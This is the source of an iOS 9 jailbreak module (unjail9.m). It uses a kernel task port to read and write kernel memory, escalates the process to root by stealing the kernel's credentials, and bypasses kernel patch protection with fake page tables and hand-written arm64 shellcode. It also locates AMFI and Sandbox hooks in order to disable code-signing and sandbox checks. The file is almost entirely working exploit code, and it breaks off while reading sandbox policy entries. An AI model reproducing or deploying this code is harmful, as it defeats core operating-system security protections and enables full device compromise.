/*
 *  unjail9.m
 *  kokeshidoll
 *
 *  Created by sakuRdev on 2021/12/02.
 *  Copyright (c) 2021 - 2022 sakuRdev. All rights reserved.
 *
 *  Permission is hereby granted, free of charge, to any person obtaining a copy
 *  of this software and associated documentation files (the "Software"), to deal
 *  in the Software without restriction, including without limitation the rights
 *  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 *  copies of the Software, and to permit persons to whom the Software is
 *  furnished to do so, subject to the following conditions:
 *
 *  The above copyright notice and this permission notice shall be included in all
 *  copies or substantial portions of the Software.
 *
 *  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 *  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 *  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 *  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 *  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 *  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 *  SOFTWARE.
 *
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>

#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/mount.h>

#include "common.h"
#include "kernel.h"
#include "unjail9.h"
#include "pte.h"

#include "mac.h"

// log
extern void (*printLog)(const char *text, ...);

// kernel_task
mach_port_t tfp0 = 0;

// for patchfinder
static uint8_t *kdata = NULL;
static size_t ksize = 0;
static uint64_t kernel_entry = 0;
uint64_t kerndumpbase = -1;
static void *kernel_mh = 0;

#ifdef __LP64__
// aarch64

// pagetable size
extern char isvad;

// kext
static uint64_t amfi_kext_data_base = 0;
static uint64_t amfi_kext_data_size = 0;

static uint64_t sandbox_kext_data_base = 0;
static uint64_t sandbox_kext_data_size = 0;

static uint64_t lwvm_kext_data_base = 0;
static uint64_t lwvm_kext_data_size = 0;

// kpp utils
uint64_t slide = 0;
uint64_t gPhysBase = 0;
uint64_t gVirtBase = 0;
uint64_t level1_table = 0;
uint64_t ttbr1_el1 = 0;

#else
// aarch32

// serch __TEXT free area
kaddr_t text_vmaddr = 0;
size_t text_vmsize = 0;
kaddr_t text_text_sec_addr = 0;
size_t text_text_sec_size = 0;
kaddr_t text_const_sec_addr = 0;
size_t text_const_sec_size = 0;
kaddr_t text_cstring_sec_addr = 0;
size_t text_cstring_sec_size = 0;
kaddr_t text_os_log_sec_addr = 0;
size_t text_os_log_sec_size = 0;
kaddr_t data_vmaddr = 0;
size_t data_vmsize = 0;

// pagetable
uint32_t tte_virt;
uint32_t tte_phys;

// get root
extern uint32_t myProc;
extern uint32_t myUcred;
#endif

// Add kbase to off. if not, return 0.
static kaddr_t KOFFSET(kaddr_t base, kaddr_t off)
{
    if(!off) {
#ifdef DEBUG
        NSLog(@"[ERROR] Failed to get koffset");
#endif
        return 0;
    }
#ifdef DEBUG
    NSLog(@"[KOFFSET] %llx", base+off);
#endif
    return base+off;
}

static int init_kernel(kaddr_t base)
{
    unsigned i;
    uint8_t buf[KERNEL_HEADER_SIZE];
    const struct mach_header *hdr = (struct mach_header *)buf;
    const uint8_t *q;
    uint64_t min = -1;
    uint64_t max = 0;
    
    copyin(buf, base, sizeof(buf));
#ifdef __LP64__
    q = buf + sizeof(struct mach_header) + 4;
#else
    q = buf + sizeof(struct mach_header) + 0;
#endif
    
    for (i = 0; i < hdr->ncmds; i++) {
        const struct load_command *cmd = (struct load_command *)q;
#ifdef __LP64__
        if (cmd->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *seg = (struct segment_command_64 *)q;
            if (min > seg->vmaddr) {
                min = seg->vmaddr;
            }
            if (max < seg->vmaddr + seg->vmsize) {
                max = seg->vmaddr + seg->vmsize;
            }
        }
#else
        if (cmd->cmd == LC_SEGMENT) {
            const struct segment_command *seg = (struct segment_command *)q;
            if (min > seg->vmaddr) {
                min = seg->vmaddr;
            }
            if (max < seg->vmaddr + seg->vmsize) {
                max = seg->vmaddr + seg->vmsize;
            }
            if (!strcmp(seg->segname, "__TEXT")) {
                text_vmaddr = seg->vmaddr;
                text_vmsize = seg->vmsize;
                
                const struct section *sec = (struct section *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(sec[j].sectname, "__text")) {
                        text_text_sec_addr = sec[j].addr;
                        text_text_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__const")) {
                        text_const_sec_addr = sec[j].addr;
                        text_const_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__cstring")) {
                        text_cstring_sec_addr = sec[j].addr;
                        text_cstring_sec_size = sec[j].size;
                    } else if (!strcmp(sec[j].sectname, "__os_log")) {
                        text_os_log_sec_addr = sec[j].addr;
                        text_os_log_sec_size = sec[j].size;
                    }
                }
            } else if (!strcmp(seg->segname, "__DATA")) {
                data_vmaddr = seg->vmaddr;
                data_vmsize = seg->vmsize;
            }
        }
#endif
        if (cmd->cmd == LC_UNIXTHREAD) {
            uint32_t *ptr = (uint32_t *)(cmd + 1);
            uint32_t flavor = ptr[0];
            struct {
#ifdef __LP64__
                uint64_t x[29];    /* General purpose registers x0-x28 */
                uint64_t fp;    /* Frame pointer x29 */
                uint64_t lr;    /* Link register x30 */
                uint64_t sp;    /* Stack pointer x31 */
                uint64_t pc;     /* Program counter */
                uint32_t cpsr;    /* Current program status register */
#else
                uint32_t    r[13];  /* General purpose register r0-r12 */
                uint32_t    sp;     /* Stack pointer r13 */
                uint32_t    lr;     /* Link register r14 */
                uint32_t    pc;     /* Program counter r15 */
                uint32_t    cpsr;   /* Current program status register */
#endif
            } *thread = (void *)(ptr + 2);
            if (flavor == 6) {
                kernel_entry = thread->pc;
            }
        }
        q = q + cmd->cmdsize;
    }
    
    kerndumpbase = min;
    ksize = max - min;
    
    kdata = malloc(ksize);
    if (!kdata) {
        return -1;
    }
    
    copyin(kdata, kerndumpbase, ksize);

    kernel_mh = kdata + base - min;
    
    return 0;
}


#ifdef __LP64__
/*-- pangu9(9.3.3) method --*/
static void sb_memset_hook(uint64_t sbshc, uint64_t x30_ptr, uint64_t equal, uint64_t next)
{
    /*
     * Replace _memset.stub with shellcode in the following policy hook functions,
     * set x0 register to 0, and jump to ret_gadget.
     *
     *  mpo_proc_check_fork
     *  mpo_iokit_check_open
     *  mpo_mount_check_fsctl
     *  mpo_vnode_check_rename
     *  mpo_vnode_check_access
     *  mpo_vnode_check_chroot
     *  mpo_vnode_check_create
     *  mpo_vnode_check_deleteextattr
     *  mpo_vnode_check_exchangedata
     *  mpo_vnode_check_getattrlist
     *  mpo_vnode_check_getextattr
     *  mpo_vnode_check_ioctl
     *  mpo_vnode_check_link
     *  mpo_vnode_check_listextattr
     *  mpo_vnode_check_open
     *  mpo_vnode_check_readlink
     *  mpo_vnode_check_revoke
     *  mpo_vnode_check_setattrlist
     *  mpo_vnode_check_setextattr
     *  mpo_vnode_check_setflags
     *  mpo_vnode_check_setmode
     *  mpo_vnode_check_setowner
     *  mpo_vnode_check_setutimes
     *  mpo_vnode_check_stat
     *  mpo_vnode_check_truncate
     *  mpo_vnode_check_unlink
     *  mpo_file_check_mmap
     *
     */
    
    DEBUGLog("%llx", sbshc);
    DEBUGLog("%llx, %llx, %llx", x30_ptr, equal, next);
                                    // _shellcode: check x30 register to branch which function it came from.
    wk32(sbshc + 0x00, 0x58000110); //     ldr        x16, _x30_ptr
    wk32(sbshc + 0x04, 0xeb1003df); //     cmp        x30, x16
    wk32(sbshc + 0x08, 0x54000060); //     b.eq       _ret0
    wk32(sbshc + 0x0c, 0x58000128); //     ldr        x8, _next
    wk32(sbshc + 0x10, 0xd61f0100); //     br         x8
                                    //  _ret0: x0 to 0 and jump to ret_gadget of original functions.
    wk32(sbshc + 0x14, 0xd2800000); //     movz       x0, #0x0
    wk32(sbshc + 0x18, 0x58000088); //     ldr        x8, _equal
    wk32(sbshc + 0x1c, 0xd61f0100); //     br         x8
    
    wkptr(sbshc + 0x20, x30_ptr);   // _x30_ptr
    wkptr(sbshc + 0x28, equal);     // _equal
    wkptr(sbshc + 0x30, next);      // _next
}

/*-- search KEXT __DATA offsets --*/
static int init_kext(kaddr_t region, uint8_t* kdata, size_t ksize)
{
    int i = 0;
    
    {
        uint8_t* kextBase = memmem(kdata, ksize, "com.apple.driver.AppleMobileFileIntegrity", sizeof("com.apple.driver.AppleMobileFileIntegrity"));
        if(!kextBase)
            goto fail;
        
        uint64_t de = (uintptr_t)kextBase - (uintptr_t)kdata;
        while(i<de)
        {
            if(*(uint32_t*)kextBase == 0xfeedfacf)
                break;
            kextBase -= 1;
            i += 1;
        }
        
        const struct mach_header *hdr = (struct mach_header *)kextBase;
        printLog("found AMFI kext: %x", hdr->magic);
        if(hdr->magic != 0xfeedfacf) {
            DEBUGLog("[ERROR] unkown magic!");
            goto fail;
        }
        
        const unsigned char *q;
        q = (unsigned char*)hdr + sizeof(struct mach_header) + 4;
        
        for (i = 0; i < hdr->ncmds; i++) {
            const struct load_command *cmd = (struct load_command *)q;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (struct segment_command_64 *)q;
                if (!strcmp(seg->segname, "__DATA")) {
                    amfi_kext_data_base = seg->vmaddr;
                    amfi_kext_data_size = seg->vmsize;
                }
            }
            q = q + cmd->cmdsize;
        }
        
    }
    
    {
        uint8_t* kextBase = memmem(kdata, ksize, "com.apple.security.sandbox", sizeof("com.apple.security.sandbox"));
        if(!kextBase)
            goto fail;
        
        uint64_t de = (uintptr_t)kextBase - (uintptr_t)kdata;
        while(i<de)
        {
            if(*(uint32_t*)kextBase == 0xfeedfacf)
                break;
            kextBase -= 1;
            i += 1;
        }
        
        const struct mach_header *hdr = (struct mach_header *)kextBase;
        printLog("found Sandbox kext: %x", hdr->magic);
        if(hdr->magic != 0xfeedfacf) {
            DEBUGLog("[ERROR] unkown magic!");
            goto fail;
        }
        
        const unsigned char *q;
        q = (unsigned char*)hdr + sizeof(struct mach_header) + 4;
        
        for (i = 0; i < hdr->ncmds; i++) {
            const struct load_command *cmd = (struct load_command *)q;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (struct segment_command_64 *)q;
                if (!strcmp(seg->segname, "__DATA")) {
                    sandbox_kext_data_base = seg->vmaddr;
                    sandbox_kext_data_size = seg->vmsize;
                }
            }
            q = q + cmd->cmdsize;
        }
        
    }
    
    {
        uint8_t* kextBase = memmem(kdata, ksize, "com.apple.driver.LightweightVolumeManager", sizeof("com.apple.driver.LightweightVolumeManager"));
        if(!kextBase)
            goto fail;
        
        uint64_t de = (uintptr_t)kextBase - (uintptr_t)kdata;
        while(i<de)
        {
            if(*(uint32_t*)kextBase == 0xfeedfacf)
                break;
            kextBase -= 1;
            i += 1;
        }
        
        const struct mach_header *hdr = (struct mach_header *)kextBase;
        printLog("found LwVM kext: %x", hdr->magic);
        if(hdr->magic != 0xfeedfacf) {
            DEBUGLog("[ERROR] unkown magic!");
            goto fail;
        }
        
        const unsigned char *q;
        q = (unsigned char*)hdr + sizeof(struct mach_header) + 4;
        
        for (i = 0; i < hdr->ncmds; i++) {
            const struct load_command *cmd = (struct load_command *)q;
            if (cmd->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (struct segment_command_64 *)q;
                if (!strcmp(seg->segname, "__DATA")) {
                    lwvm_kext_data_base = seg->vmaddr;
                    lwvm_kext_data_size = seg->vmsize;
                }
            }
            q = q + cmd->cmdsize;
        }
        
    }
    
    printLog("amfi.kext __DATA SEGMENT: %016llx", amfi_kext_data_base);
    printLog("amfi.kext __DATA SEGMENT size: %016llx", amfi_kext_data_size);
    
    printLog("sandbox.kext __DATA SEGMENT: %016llx", sandbox_kext_data_base);
    printLog("sandbox.kext __DATA SEGMENT size: %016llx", sandbox_kext_data_size);
    
    printLog("lwvm.kext __DATA SEGMENT: %016llx", lwvm_kext_data_base);
    printLog("lwvm.kext __DATA SEGMENT size: %016llx", lwvm_kext_data_size);
    
    return 0;
    
fail:
    return -1;
}
#endif


/*-- jailbreak --*/
static int kpatch9(kaddr_t region, kaddr_t lwvm_type, int kpp)
{
    init_kernel(region);

#ifdef __LP64__
    checkvad();
    if (kpp)
        init_kext(region, kdata, ksize);
#endif
    
#ifndef __LP64__
    // get root
    kaddr_t allproc;
    if(!(allproc = KOFFSET(region, find_allproc(region, kdata, ksize)))) goto fail;
    
    vm_size_t sz = 4;
    pid_t uid = getuid();
    if(uid != 0){
        uint32_t kproc = 0;
        myProc = 0;
        myUcred = 0;
        pid_t mypid = getpid();
        uint32_t proc = 0;
        vm_read_overwrite(tfp0, allproc, sz, (vm_address_t)&proc, &sz);
        while (proc) {
            uint32_t pid = 0;
            vm_read_overwrite(tfp0, proc + 8, sz, (vm_address_t)&pid, &sz);
            if (pid == mypid) {
                myProc = proc;
            } else if (pid == 0) {
                kproc = proc;
            }
            vm_read_overwrite(tfp0, proc, sz, (vm_address_t)&proc, &sz);
        }
        vm_read_overwrite(tfp0, myProc + 0xa4, sz, (vm_address_t)&myUcred, &sz);
        uint32_t kcred = 0;
        vm_read_overwrite(tfp0, kproc + 0xa4, sz, (vm_address_t)&kcred, &sz);
        vm_write(tfp0, myProc + 0xa4, (vm_address_t)&kcred, sz);
        setuid(0);
        printLog("[*] got root: %x", getuid());
    }
#endif
    
#ifdef __LP64__
    /*-- KPP --*/
    uint64_t cpacr_el1 = 0;
    uint64_t pmap_location = 0;
    uint64_t cpu_ttep = 0;
    uint64_t gPhysAddr = 0;
    uint64_t gVirtAddr = 0;
    
    slide = region - KERNEL_BASE_ADDRESS;
    
    uint64_t physp = 0;
    uint64_t idlesleep_handler = 0;
    uint64_t reg = 0;
    int z = 0;
    uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
    uint64_t physcode = 0;
    
    if (kpp) {
        printLog("Detected: patched version");
        printLog("__got is already KPP. But it's still patchable.");
        printLog("running qwertyoruiop's KPP bypass...");
        
        if(!(cpacr_el1 = KOFFSET(region, find_cpacr_el1(region, kdata, ksize)))) goto fail;
        if(!(pmap_location = KOFFSET(region, find_pmap_location(region, kdata, ksize)))) goto fail;
        if(!(cpu_ttep = KOFFSET(region, find_ttbr1_el1(region, kdata, ksize)))) goto fail;
        if(!(gPhysAddr = KOFFSET(region, find_gPhysAddr(region, kdata, ksize)))) goto fail;
        if(!(gVirtAddr = KOFFSET(region, find_gVirtAddr(region, kdata, ksize)))) goto fail;
        
        printLog("cpacr_el1: %016llx", cpacr_el1);
        printLog("pmap_location: %016llx", pmap_location);
        printLog("cpu_ttep: %016llx", cpu_ttep);
        printLog("gPhysAddr: %016llx", gPhysAddr);
        printLog("gVirtAddr: %016llx", gVirtAddr);
        
        gPhysBase = rk64(gPhysAddr);
        gVirtBase = rk64(gVirtAddr);
        if(!gPhysBase || !gPhysBase)
            goto fail;
        printLog("gPhysBase: %016llx", gPhysBase);
        printLog("gVirtBase: %016llx", gVirtBase);
        
        level1_table = rk64(rk64(pmap_location));
        if(!level1_table)
            goto fail;
        printLog("level1_table: %llx", level1_table);
        
        /*---- bypass ----*/
        uint64_t entryp = kernel_entry + slide;
        if(!entryp)
            goto fail;
        DEBUGLog("entryp: %llx", entryp);
        
        uint64_t rvbar = entryp & (~0xFFF);
        DEBUGLog("rvbar: %llx", rvbar);
        
        uint64_t cpul = find_register_value(kdata, rvbar+0x54, 1); // 9.3.3, n51
        if(!cpul)
            goto fail;
        DEBUGLog("cpul: %llx", cpul);
        
        uint64_t cpu_list = rk64(cpul - 0x10) - gPhysBase + gVirtBase;
        if(!cpu_list)
            goto fail;
        
        uint64_t cpu_data_paddr = rk64(cpu_list);
        if(!cpu_data_paddr)
            goto fail;
        DEBUGLog("cpu_list: %llx", cpu_list);
        DEBUGLog("cpu_data_paddr: %llx", cpu_data_paddr);
        
        ttbr1_el1 = rk64(cpu_ttep);
        if(!ttbr1_el1)
            goto fail;
        printLog("ttbr1_el1: %llx", ttbr1_el1);
        
        uint64_t shtramp = region + ((const struct mach_header *)kernel_mh)->sizeofcmds + sizeof(struct mach_header_64);
        if(!shtramp || (shtramp == region))
            goto fail;
        printLog("shtramp: %llx", shtramp);
        
        /*--- cpu ---*/
        uint64_t cpu = cpu_data_paddr;
        int idx = 0;
        int ridx = 0;
        
        while (cpu) {
            cpu = cpu - gPhysBase + gVirtBase;
            if ((rk64(cpu+0x130) & 0x3FFF) == 0x100) {
                printLog("already jailbroken?, bailing out");
                goto fail;
            }
            
            if (!idlesleep_handler) {
                idlesleep_handler = rk64(cpu+0x130) - gPhysBase + gVirtBase;
                if(!idlesleep_handler)
                    goto fail;
                uint32_t* opcz = malloc(0x1000);
                copyin(opcz, idlesleep_handler, 0x1000);
                idx = 0;
                while (1) {
                    if (opcz[idx] == 0xd61f0000 /* br x0 */) {
                        break;
                    }
                    idx++;
                }
                ridx = idx;
                while (1) {
                    if (opcz[ridx] == 0xd65f03c0 /* ret */) {
                        break;
                    }
                    ridx++;
                }
            }
            
            printLog("found cpu: %x", rk32(cpu+0x330));
            printLog("found physz: %llx", rk64(cpu+0x130) - gPhysBase + gVirtBase);
            
            plist[z++] = cpu+0x130;
            cpu_list += 0x10;
            cpu = rk64(cpu_list);
        }
        
        printLog("idlesleep_handler: %llx", idlesleep_handler);
        
        uint64_t regi = find_register_value(kdata, idlesleep_handler+12, 30);
        uint64_t regd = find_register_value(kdata, idlesleep_handler+24, 30);
        if(!regi || !regd)
            goto fail;
        DEBUGLog("%llx, %llx", regi, regd);
        
        uint64_t ml_get_wake_timebase = region + find_ml_get_wake_timebase(region, kdata, ksize);
        if(!ml_get_wake_timebase)
            goto fail;
        DEBUGLog("ml_get_wake_timebase: %llx", ml_get_wake_timebase);
        
        uint64_t preg = find_register_value(kdata, ml_get_wake_timebase+8, 8);
        if(!preg)
            goto fail;
        
        reg = search_handler(preg, rk32(ml_get_wake_timebase+8));
        if(!reg)
            goto fail;
        DEBUGLog("reg: %llx, %llx, %llx", preg, reg, idlesleep_handler - gVirtBase + gPhysBase);
        
        
        /*-- fake ttbr --*/
        DEBUGLog("%x", isvad == 0 ? 0x4000 : 0x1000);
        
        uint64_t level0_pte = physalloc(isvad == 0 ? 0x4000 : 0x1000);
        if(!level0_pte)
            goto fail;
        
        char* bbuf = malloc(isvad == 0 ? 0x4000 : 0x1000);
        copyin(bbuf, ttbr1_el1 - gPhysBase + gVirtBase, isvad == 0 ? 0x4000 : 0x1000);
        copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
        physp = pagetable_lookup(level0_pte, ttbr1_el1, RETVAL_PHYS);
        printLog("fake ttbr1_el1: %llx", physp);
        if(!physp)
            goto fail;
        
        /*-- shellcode --*/
        uint64_t shellcode = physalloc(isvad == 0 ? 0x4000 : 0x1000);
        if(!shellcode)
            goto fail;
        
        wk32(shellcode + 0x100 + 0, 0x5800009e); /* trampoline for idlesleep */
        wk32(shellcode + 0x100 + 4, 0x580000a0);
        wk32(shellcode + 0x100 + 8, 0xd61f0000);
        
        wk32(shellcode + 0x200 + 0, 0x5800009e); /* trampoline for deepsleep */
        wk32(shellcode + 0x200 + 4, 0x580000a0);
        wk32(shellcode + 0x200 + 8, 0xd61f0000);
        
        physcode = pagetable_lookup(shellcode, ttbr1_el1, RETVAL_PHYS);
        if(!physcode)
            goto fail;
        DEBUGLog("physcode: %llx", physcode);
        
        /*-- shc --*/
        uint64_t shc = physalloc(isvad == 0 ? 0x4000 : 0x1000);
        if(!shc)
            goto fail;
        DEBUGLog("shc: %llx", shc);
        for (int i = 0; i < 0x500/4; i++) {
            wk32(shc+i*4, 0xd503201f); // nop
        }
        
        {
            wk32(shc,    0x5800019e); // ldr x30, #40
            wk32(shc+4,  0xd518203e); // msr ttbr1_el1, x30
            wk32(shc+8,  0xd508871f); // tlbi vmalle1
            wk32(shc+12, 0xd5033fdf); // isb
            wk32(shc+16, 0xd5033f9f); // dsb sy
            wk32(shc+20, 0xd5033b9f); // dsb ish
            wk32(shc+24, 0xd5033fdf); // isb
            wk32(shc+28, 0x5800007e); // ldr x30, 8
            wk32(shc+32, 0xd65f03c0); // ret
            wk64(shc+40, regi);  // idlesleep
            wk64(shc+48, physp); // ttbr1_el1_fake
            
            wk32(shc+0x100,    0x5800019e); // ldr x30, #40
            wk32(shc+0x100+4,  0xd518203e); // msr ttbr1_el1, x30
            wk32(shc+0x100+8,  0xd508871f); // tlbi vmalle1
            wk32(shc+0x100+12, 0xd5033fdf); // isb
            wk32(shc+0x100+16, 0xd5033f9f); // dsb sy
            wk32(shc+0x100+20, 0xd5033b9f); // dsb ish
            wk32(shc+0x100+24, 0xd5033fdf); // isb
            wk32(shc+0x100+28, 0x5800007e); // ldr x30, 8
            wk32(shc+0x100+32, 0xd65f03c0); // ret
            wk64(shc+0x100+40, regd);  // deepsleep
            wk64(shc+0x100+48, physp); // ttbr1_el1_fake
        }
        
        mach_vm_protect(tfp0, shc, isvad == 0 ? 0x4000 : 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
        
        /*-- shellcode --*/
        wk64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
        wk64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
        
        wk64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
        wk64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
        
        /*-- kppsh --*/
        uint64_t kppsh = physalloc(isvad == 0 ? 0x4000 : 0x1000);
        if(!kppsh)
            goto fail;
        DEBUGLog("kppsh: %llx", kppsh);
        
        {
            wk32(kppsh+0x00, 0x580001e1); // ldr    x1, #60
            wk32(kppsh+0x04, 0x58000140); // ldr    x0, #40
            wk32(kppsh+0x08, 0xd5182020); // msr    TTBR1_EL1, x0
            wk32(kppsh+0x0c, 0xd2a00600); // movz   x0, #0x30, lsl #16
            wk32(kppsh+0x10, 0xd5181040); // msr    CPACR_EL1, x0
            wk32(kppsh+0x14, 0xd5182021); // msr    TTBR1_EL1, x1
            wk32(kppsh+0x18, 0x10ffffe0); // adr    x0, #-4
            wk32(kppsh+0x1c, isvad ? 0xd5033b9f : 0xd503201f); // dsb ish (4k) / nop (16k)
            wk32(kppsh+0x20, isvad ? 0xd508871f : 0xd508873e); // tlbi vmalle1 (4k) / tlbi    vae1, x30 (16k)
            wk32(kppsh+0x24, 0xd5033fdf); // isb
            wk32(kppsh+0x28, 0xd65f03c0); // ret
            wk64(kppsh+0x2c, ttbr1_el1);
            wk64(kppsh+0x34, physp);
            wk64(kppsh+0x3c, physp);
        }
        
        mach_vm_protect(tfp0, kppsh, isvad == 0 ? 0x4000 : 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
        
        sleep(1);
        /*
         
         pagetables are now not real anymore, they're real af
         
         */
        
        printLog("Remapping cpacr_EL1");
        
        uint64_t new_cpacr_addr = fakepage_lookup(cpacr_el1, physp, true);
        if(!new_cpacr_addr || (new_cpacr_addr == cpacr_el1))
            goto fail;
        wk32(new_cpacr_addr, 0x94000000 | (((shtramp - cpacr_el1)/4) & 0x3FFFFFF));// call kppsh
        
        uint64_t new_shtramp = fakepage_lookup(shtramp, physp, true);
        if(!new_shtramp || (new_shtramp == shtramp))
            goto fail;
        wk32(new_shtramp,   0x58000041); // ldr      x1, =kppsh
        wk32(new_shtramp+4, 0xd61f0020); // br       x1
        wk64(new_shtramp+8, kppsh);      // .quad    _kppsh
        
#define PSZ (isvad ? 0x1000 : 0x4000)
#define PMK (PSZ-1)
        
        // remap __DATA seg
        {
            printLog("Remapping AMFI __DATA segment");
            uint64_t kext_end = amfi_kext_data_base + amfi_kext_data_size;
            uint64_t nopag = kext_end - amfi_kext_data_base;
            for (int i = 0; i < nopag; i+= PSZ) {
                fakepage_lookup(((amfi_kext_data_base + i) & (~PMK)), physp, false);
            }
        }
        
        {
            printLog("Remapping Sandbox __DATA segment");
            uint64_t kext_end = sandbox_kext_data_base + sandbox_kext_data_size;
            uint64_t nopag = kext_end - sandbox_kext_data_base;
            for (int i = 0; i < nopag; i+= PSZ) {
                fakepage_lookup(((sandbox_kext_data_base + i) & (~PMK)), physp, false);
            }
        }
        
        {
            printLog("Remapping LwVM __DATA segment");
            uint64_t kext_end = lwvm_kext_data_base + lwvm_kext_data_size;
            uint64_t nopag = kext_end - lwvm_kext_data_base;
            for (int i = 0; i < nopag; i+= PSZ) {
                fakepage_lookup(((lwvm_kext_data_base + i) & (~PMK)), physp, false);
            }
        }
    }
    
    /*
     end bypass setup
     */
    
#endif
    
    /*
     * patchfinder
     */
    
    /*--- helpers ---*/
    kaddr_t ret0_gadget;
    kaddr_t ret1_gadget;
    
    /*--- AMFI  ---*/
    // __got
    kaddr_t amfi_PE_i_can_has_debugger_got;
    kaddr_t amfi_cs_enforcement_got;
#ifdef __LP64__
    kaddr_t amfi_vnode_isreg_got;
    
    // shellcode
    kaddr_t _amfi_execve_hook;
    kaddr_t _vnode_isreg;
    kaddr_t amfiBase;
#else
    kaddr_t amfi_execve_ret;
    kaddr_t cs_enforcement_disable;
#endif
    
    /*--- LwVM ---*/
    // __got
    kaddr_t lwvm_krnl_conf_got;
    // jmp
    kaddr_t lwvm_jump;
    
    /*--- Sandbox ---*/
    // policy_ops
    kaddr_t sbops;
    
#ifdef __LP64__
    // shellcode
    kaddr_t memset_stub;
    kaddr_t sbBase;
#endif
    
    // __got
    kaddr_t sb_PE_i_can_has_debugger_got;
#ifdef __LP64__
    kaddr_t sb_memset_got;
#endif
    
    /*-- remount --*/
    // sb __got
    kaddr_t sb_vfs_rootvnode_got;
    
    // fn
    kaddr_t vfs_rootvnode_fn;
    kaddr_t rootvnode;
    kaddr_t rootfs_vnode;
    
#ifndef __LP64__
    // legacy
    kaddr_t vm_fault_enter;
    kaddr_t vm_map_enter;
    kaddr_t vm_map_protect;
    kaddr_t csops;
    kaddr_t pmap_location;
    kaddr_t tfp0_patch;
#endif
    
    // MAC
    struct mac_policy_ops mpc_ops;
    memset(&mpc_ops, '\0', sizeof(struct mac_policy_ops));
    
#ifdef __LP64__
    struct mpo_hook_list mpc_list;
    memset(&mpc_list, '\0', sizeof(struct mpo_hook_list));
#endif
    
    printLog("Searching koffsets..");
    
    {
        DEBUGLog("gadget");
        if(!(ret0_gadget = KOFFSET(region, find_ret0_gadget(region, kdata, ksize)))) goto fail;
        if(!(ret1_gadget = KOFFSET(region, find_ret1_gadget(region, kdata, ksize)))) goto fail;
        printLog("[Found] %s", "gadget");
    }
    
    {
        DEBUGLog("AMFI __got");
        if(!(amfi_PE_i_can_has_debugger_got = KOFFSET(region, find_amfi_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
        if(!(amfi_cs_enforcement_got = KOFFSET(region, find_amfi_cs_enforcement_got(region, kdata, ksize)))) goto fail;
#ifdef __LP64__
        if(!(amfi_vnode_isreg_got = KOFFSET(region, find_vnode_isreg_in_amfi_execve_hook(region, kdata, ksize)))) goto fail;
#endif
        printLog("[Found] %s", "AMFI __got");
    }
    
    {
        DEBUGLog("AMFI shellcode");
#ifdef __LP64__
        if(!(_amfi_execve_hook = KOFFSET(region, find_amfi_execve_hook(region, kdata, ksize)))) goto fail;
        _vnode_isreg = rkptr(amfi_vnode_isreg_got); // 9.3.3: 0xffffff800414e214
        if(!_vnode_isreg) {
            DEBUGLog("[ERROR] Failed to read offset!");
            goto fail;
        }
#else
        if(!(amfi_execve_ret = KOFFSET(region, find_amfi_execve_ret(region, kdata, ksize)))) goto fail;
        if(!(cs_enforcement_disable = KOFFSET(region, find_cs_enforcement_disable_amfi(region, kdata, ksize)))) goto fail;
#endif
        printLog("[Found] %s", "AMFI shellcode");
    }
    
    {
        DEBUGLog("LwVM __got");
        if(lwvm_type == 1){
            // 9.3.2-9.3.5
            if(!(lwvm_krnl_conf_got = KOFFSET(region, find_PE_i_can_has_kernel_configuration_got(region, kdata, ksize)))) goto fail;
        } else {
#ifdef __LP64__
            // 9.2?-9.3.1
            if(!(lwvm_krnl_conf_got = KOFFSET(region, find_LwVM_PE_i_can_has_debugger_got(region, kdata, ksize)))) goto fail;
#else
            // TODO
            goto fail;
#endif
        }
        if(!(lwvm_jump = KOFFSET(region, find_lwvm_jump(region, kdata, ksize)))) goto fail;
        printLog("[Found] %s", "LwVM __got");
    }
    
    {
        DEBUGLog("Sandbox ops");
        if(!(sbops = KOFFSET(region, find_sandbox_mac_policy_ops(region, kdata, ksize)))) goto fail;
        printLog("[Found] %s", "Sandbox ops");
    }

#ifdef __LP64__
    {
        DEBUGLog("_memset.stub");
        if(!(memset_stub = KOFFSET(region, find_memset(region, kdata, ksize)))) goto fail;
        printLog("[Found] %s", "memset");
    }
#endif
    
    {
        DEBUGLog("MAC");
        /* ops */
        if(!(mpc_ops.mpo_mount_check_remount = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_remount)))) goto fail;
        if(!(mpc_ops.mpo_vnode_check_exec = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)))) goto fail;
        if(!(mpc_ops.mpo_proc_check_fork = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork)))) goto fail;
        if(!(mpc_ops.mpo_iokit_check_open = rkptr(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open)))) goto fail;
